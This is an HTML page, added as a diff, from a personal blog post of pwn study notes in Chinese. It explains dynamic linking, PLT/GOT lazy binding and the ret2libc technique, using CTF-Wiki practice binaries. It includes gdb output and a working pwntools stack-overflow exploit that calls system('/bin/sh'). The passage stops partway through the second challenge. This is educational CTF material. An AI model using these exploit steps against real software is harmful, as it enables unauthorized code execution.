@@ -1,0 +1,622 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Pwn" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/52965aaa.html">
+
+
+
+  <title>
+pwn学习笔记（4）ret2libc - Pwn手的自我修养 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">pwn学习笔记（4）ret2libc
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-02-19 18:10:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-02-19T18:10:34+08:00">2024-02-19</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture131.png">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Pwn/" itemprop="item" rel="index" title="分类于 Pwn手的自我修养"><span itemprop="name">Pwn手的自我修养</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/52965aaa.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="pwn学习笔记4"><a class="markdownIt-Anchor" href="#pwn学习笔记4">#</a> pwn 学习笔记（4）</h1>
+<h2 id="静态链接"><a class="markdownIt-Anchor" href="#静态链接">#</a> 静态链接：</h2>
+<p>​	静态链接是由链接器在链接时将库的内容加入到可执行程序中的做法。链接器是一个独立程序，将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一块生成可执行程序。这里的库指的是静态链接库，Windows 下以.lib 为后缀，Linux 下以.a 为后缀。</p>
+<p>​	也就是说将静态链接库中的所有的函数都写入这个 ELF 文件中，所以会造成该二进制文件极为庞大，因此也会存在很多的可供利用来 ret2syscall 的 gadgets。但是，使用静态链接生成的可执行文件体积较大，包含相同的公共代码，造成浪费。</p>
+<p>​	对于 ret2syscall 而言，我们能够在程序中找到众多的可以给我们利用的 gadgets，主要是因为二进制程序是静态链接程序，正因为如此，存在众多的 gadgets，给我们构造系统调用。</p>
+<h2 id="动态链接"><a class="markdownIt-Anchor" href="#动态链接">#</a> 动态链接：</h2>
+<h3 id="1简述"><a class="markdownIt-Anchor" href="#1简述">#</a> 1. 简述：</h3>
+<p>​	动态链接（Dynamic Linking），把链接这个过程推迟到了运行时再进行，在可执行文件装载时或运行时，由操作系统的装载程序加载库。这里的库指的是动态链接库，Windows 下以.dll 为后缀，Linux 下以.so 为后缀。</p>
+<p>​	动态链接可以大规模减小 ELF 文件的大小，几乎动态链接库中的文件不用直接写入 ELF 文件中，因此，ELF 文件中就缺少足够的 gadgets 可供构造出系统调用。</p>
+<p>​	对于动态链接的程序而言，如果遇到一个需要的存在于动态链接库中的函数，例如：puts ()，system ()，printf () 等等，这个时候，因为这些程序并没有写入 ELF 文件中，因此，这是就需要从栈和堆之间的 shared libraries 段去查找相关的函数的代码以及一些全局变量，例如：&quot;/bin/sh&quot;。</p>
+<p>​	那么，动态链接应该如何进行呢？</p>
+<p>​	在正式讲述这个过程之前，首先需要知道两个东西：</p>
+<p>​	1、用来存放外部函数地址的数据段：<strong>全局偏移表</strong>（<strong>GOT</strong>, Global Offset Table）</p>
+<p>​	2、用来获取数据段记录的外部函数地址的代码：<strong>程序链接表</strong>（<strong>PLT</strong>，Procedure Link Table）</p>
+<p>​	3、为了安全起见，shared libraries 段所存放的动态链接的函数的代码的基地址是随机的，但是每个函数相对于基地址的偏移量是相同的。</p>
+<p>​	4. 延迟绑定：只有动态库函数在被调用时，才会地址解析和重定位工作。</p>
+<p>​	对于 plt 表和 got 表的简述：</p>
+<p>​	plt 表存放了一部分的代码，用于跳转到 got 表中被调用函数相对应的地址。</p>
+<p>​	got 表存放了在 shared libraries 段中的相对的代码的正确的地址。</p>
+<h3 id="2过程"><a class="markdownIt-Anchor" href="#2过程">#</a> 2. 过程：</h3>
+<h4 id="第一次调用以printf举例"><a class="markdownIt-Anchor" href="#第一次调用以printf举例">#</a> 第一次调用（以 printf () 举例）：</h4>
+<p>​	首先展示一下相关的代码:</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/19d425d75963463a98ab32e69a30ebc2.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	首先是在 text 段中执行了 call puts@plt，这个时候，程序执行流来到了 plt 段中的 puts 函数相关的代码，也就是 jmp *(puts@got)，再之后，程序执行流跳转到了.got.plt 段中的相关的地址，但是，因为进程是第一次调用的 puts 函数，因此，got 表中，puts 函数对应的地址为 puts@plt+1，因此回到了额 push index，回到 plt 表的目的是为了解析 puts 函数的实际地址，然后执行 jmp PLT0 ，跳转到 plt 头部，为 dl_runtime_resolve 函数传参，之后执行 PLT0 的两个结束后，也就是完成了传参后，dl_runtime_resolve 函数就会开始解析 puts 函数真正的地址，并填入 got.plt 表中，之后，got.plt 中保存的就是 puts 函数真正的地址，之后返回到 text 段的 call puts@plt 重新调用 puts 函数，跳转到 plt 表的 jmp *(puts@got) 代码，之后跳转到 got.plt 表，因为 got.plt 存放的就是 puts 函数的真实地址，所以，程序执行流就会调转到 puts 函数的真实地址以调用该函数。</p>
+<h4 id="第二次调用"><a class="markdownIt-Anchor" href="#第二次调用">#</a> 第二次调用：</h4>
+<p>​	程序执行流在 text 段执行了 call puts@plt，之后跳转到 plt 执行 jmp *(puts@got)，随后直接跳转到 got.plt 表中，紧接着跳转到 puts 函数所在的动态链接库中的真实地址。</p>
+<h2 id="浅谈函数调用中的参数传递"><a class="markdownIt-Anchor" href="#浅谈函数调用中的参数传递">#</a> 浅谈函数调用中的参数传递：</h2>
+<p>​	某些情况，例如以如下程序为例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​	但程序执行到 system 函数的时候，原本此时的栈的当前位置为:</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/02806003ea09499a905c8add6b087050.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	也就是说，程序还没有执行到 call system 时（假设此时是以静态链接的 ELF 文件），栈的栈顶是如上图所示，但是，当 call system 代码执行时，将会将 ip 寄存器的值向下移一位的值压入栈中，然后跳转到 system 函数的第一行也就是 push bp，经过这两个操作后，栈的情况会如下图所示，对了，arg1 因为调用的是 system (&quot;/bin/sh&quot;) 的原因，arg1 存储的值会是 &quot;/bin/sh&quot; 的地址，如下图所示：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/5536f6e0104141ba84590bfafd442129.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	因此，传参的时候，system 想要获取到 &quot;/bin/sh&quot; 的地址，就需要跳过 bp、return_addr 这两个字长，才能够获取到参数 &quot;/bin/sh&quot; 的地址。</p>
+<h2 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc">#</a> ret2libc：</h2>
+<h3 id="1情况1"><a class="markdownIt-Anchor" href="#1情况1">#</a> 1. 情况 1：</h3>
+<h4 id="题目案例ctf-wikiret2libc1"><a class="markdownIt-Anchor" href="#题目案例ctf-wikiret2libc1">#</a> 题目案例：CTF-Wiki–ret2libc1：</h4>
+<p>​	拿到题目之后，先检查检查这个题目的保护以及架构：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># checksec ret2libc1 </span></span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>​	老样子，还是只开启了 NX 保护，32 位小端序，之后通过 IDA 反编译：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  retur</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>​	发现危险函数 gets ()，之后从函数窗口中查到了 secure 函数，怀疑该函数时一个后门函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;shell!?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​	但是，system () 函数的参数确实 &quot;shell!?&quot;，很明显，这个并不是一个正确的调用 shell 的一个方式。不过这里却给予了我们另一条路，因为开启了 NX 保护，所以无法使用 ret2shellcode 的方式来完成这个题目，因为是动态链接的题目，所以考虑 ret2syscall 的做法也不切合实际。那么，这里或许应该考虑别的方法了，也就是 ret2libc，因为这里尝试调用了 system () 函数，因此或许存在 system 的 plt 表项，那么这个题目的思路就很明显了，那就是通过栈溢出修改 ret_addr 的地址位 system 函数的 plt 表，之后传入一字长的垃圾数据（这里传入的一字长垃圾数据为的是增加偏移量，因为在 system 函数传参的时候，要绕过 bp 寄存器以及返回地址来取 &quot;/bin/sh&quot; 这一参数，所以，可知，需要绕过两个字长取参数），再然后填入 &quot;/bin/sh&quot; 的地址即可。</p>
+<p>​	分析到这里，做题的思路大概也清楚了，之后，就是找到需要的信息。</p>
+<p>​	在 IDA 中分析道，system@plt 的地址为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.plt:08048460                 jmp     ds:off_804A018</span><br></pre></td></tr></table></figure>
+<p>​	通过 ROPgadget 找到 &quot;/bin/sh&quot; 的地址为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared# ROPgadget --binary ret2libc1 --string &quot;/bin/sh&quot;</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure>
+<p>​	然后通过 gdb 调试来查找栈的偏移长度，在 main 函数上下一个断点，之后等到执行完 gets 函数之后，再传入一定个数的垃圾数据，比如全是 A，之后通过 stack 命令查看栈的情况：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 100───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd420 —▸ 0xffffd43c ◂— <span class="string">&#x27;AAAAAAAAAAAAAA&#x27;</span></span><br><span class="line">01:0004│-084 0xffffd424 ◂— 0x0</span><br><span class="line">02:0008│-080 0xffffd428 ◂— 0x1</span><br><span class="line">03:000c│-07c 0xffffd42c ◂— 0x0</span><br><span class="line">04:0010│-078 0xffffd430 —▸ 0xf7fc4570 (__kernel_vsyscall) ◂— push ecx</span><br><span class="line">05:0014│-074 0xffffd434 ◂— 0xffffffff</span><br><span class="line">06:0018│-070 0xffffd438 —▸ 0x8048034 ◂— push es</span><br><span class="line">07:001c│ eax 0xffffd43c ◂— <span class="string">&#x27;AAAAAAAAAAAAAA&#x27;</span></span><br><span class="line">... ↓        2 skipped</span><br><span class="line">0a:0028│-060 0xffffd448 ◂— 0x4141 /* <span class="string">&#x27;AA&#x27;</span> */</span><br><span class="line">0b:002c│-05c 0xffffd44c —▸ 0xffffd5fc ◂— 0x20 /* <span class="string">&#x27; &#x27;</span> */</span><br><span class="line">0c:0030│-058 0xffffd450 ◂— 0x0</span><br><span class="line">0d:0034│-054 0xffffd454 ◂— 0x0</span><br><span class="line">0e:0038│-050 0xffffd458 ◂— 0x1000000</span><br><span class="line">0f:003c│-04c 0xffffd45c ◂— 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">10:0040│-048 0xffffd460 —▸ 0xf7fc4570 (__kernel_vsyscall) ◂— push ecx</span><br><span class="line">11:0044│-044 0xffffd464 ◂— 0x0</span><br><span class="line">12:0048│-040 0xffffd468 —▸ 0xf7c184be ◂— <span class="string">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class="line">13:004c│-03c 0xffffd46c —▸ 0xf7e2a054 (_dl_audit_preinit@got.plt) —▸ 0xf7fdde10 (_dl_audit_preinit) ◂— endbr32 </span><br><span class="line">14:0050│-038 0xffffd470 —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class="line">15:0054│-034 0xffffd474 —▸ 0xf7fd6f90 (_dl_fixup+240) ◂— mov edi, eax</span><br><span class="line">16:0058│-030 0xffffd478 —▸ 0xf7c184be ◂— <span class="string">&#x27;_dl_audit_preinit&#x27;</span></span><br><span class="line">17:005c│-02c 0xffffd47c —▸ 0xf7fbe4a0 —▸ 0xf7c00000 ◂— 0x464c457f</span><br><span class="line">18:0060│-028 0xffffd480 —▸ 0xffffd4c0 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">19:0064│-024 0xffffd484 —▸ 0xf7fbe66c —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 ◂— ...</span><br><span class="line">1a:0068│-020 0xffffd488 —▸ 0xf7fbeb10 —▸ 0xf7c1acc6 ◂— <span class="string">&#x27;GLIBC_PRIVATE&#x27;</span></span><br><span class="line">1b:006c│-01c 0xffffd48c ◂— 0x1</span><br><span class="line">1c:0070│-018 0xffffd490 ◂— 0x1</span><br><span class="line">1d:0074│-014 0xffffd494 ◂— 0x0</span><br><span class="line">1e:0078│-010 0xffffd498 —▸ 0xf7e2a000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac</span><br><span class="line">1f:007c│-00c 0xffffd49c —▸ 0xf7d20f9b (__init_misc+43) ◂— add esp, 0x10</span><br><span class="line">20:0080│-008 0xffffd4a0 —▸ 0xffffd6e0 ◂— <span class="string">&#x27;/mnt/shared/ret2libc1&#x27;</span></span><br><span class="line">21:0084│-004 0xffffd4a4 ◂— 0x70 /* <span class="string">&#x27;p&#x27;</span> */</span><br><span class="line">22:0088│ ebp 0xffffd4a8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0x0</span><br></pre></td></tr></table></figure>
+<p>​	然后根据垃圾数据填入的位置（这里是 eax 的地址）到 ebp 的位置之间的长度为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffd4a8</span> - <span class="number">0xffffd43c</span></span><br></pre></td></tr></table></figure>
+<p>​	计算出来的结果为 108，所以，这里需要填入的垃圾数据的长度为 112 字节。</p>
+<p>​	好了，再之后的脚本编写就很清晰了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">bin_sh = 0x08048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(system_plt) + b&#x27;b&#x27;*4 + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="2情况2"><a class="markdownIt-Anchor" href="#2情况2">#</a> 2. 情况 2：</h3>
+<h4 id="题目案例ctf-wikiret2libc2"><a class="markdownIt-Anchor" href="#题目案例ctf-wikiret2libc2">#</a> 题目案例：CTF-Wiki–ret2libc2：</h4>
+<p>​	照理来说，这一道题与上一道题相比，并没有什么太大的区别，差别知识查看字符串的时候，会发现查找不到 &quot;/bin/sh&quot; 这一个字符串，其他的跟上一道题几乎一样。</p>
+<p>​	那么，首先 checksec 一下，为了后续的方便，这里直接使用 python 交互式来获取一些信息，用的是 ELF () 方法，来获取一部分信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/mnt/shared]</span><br><span class="line">└─<span class="comment"># python   </span></span><br><span class="line">Python <span class="number">3.11</span><span class="number">.8</span> (main, Feb  <span class="number">7</span> <span class="number">2024</span>, <span class="number">21</span>:<span class="number">52</span>:08) [GCC <span class="number">13.2</span><span class="number">.0</span>] on linux</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">&#x27;./ret2libc2&#x27;</span>)</span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/ret2libc2&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure>
+<p>​	很明显，这个题是个开启了 NX 的 32 位小端序的程序，那么，拖到 IDA 里面静态分析一下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Something surprise here, but I don&#x27;t think it will work.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What do you think ?&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​	危险函数很明显，直接就是 gets ()，然后就可以通过这一点来进行栈溢出，检查下其他函数，发现一个 secure 函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">secure</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> input; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf(&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">&quot;no_shell_QQ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​	很明显，这道题跟上一道题是差不多的，都在 secure 函数中存在一个 system 函数，但是参数却不正确，那么，之前说过，程序中不存在 &quot;/bin/sh&quot;，所以，这里应该怎么做呢？那就是自己手动写一个进去：通过栈溢出，构造 ROP，来调用两个函数，一个 gets，另一个是 system，因为这俩函数都已经在程序中写了，所以，就提供了这两个函数相关的 plt 表，那么，既然栈的地址随机化了，也就是说不知道栈的基地址是多少，所以，想往栈上写入 &quot;/bin/sh&quot; 的可能性就很低，几乎没有，因此就要考虑其他地方，经过查找，发现：bss 段存在一个变量：buf2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br></pre></td></tr></table></figure>
+<p>​	那么，就可以很清楚的知道 &quot;/bin/sh&quot; 应该写入的地址在哪里了，那就是 bss 段。</p>
+<p>​	知道了 buf2 的地址，接下来就是找到 gets 和 system 函数的地址，以及需要填入的垃圾数据的长度，首先通过 python 获取两个函数的 plt 表的地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&quot;system&quot;</span>])</span><br><span class="line"><span class="string">&#x27;0x8048490&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(elf.plt[<span class="string">&quot;gets&quot;</span>])</span><br><span class="line"><span class="string">&#x27;0x8048460&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>​	之后 gdb 动态调试获取需要的垃圾数据的长度：</p>
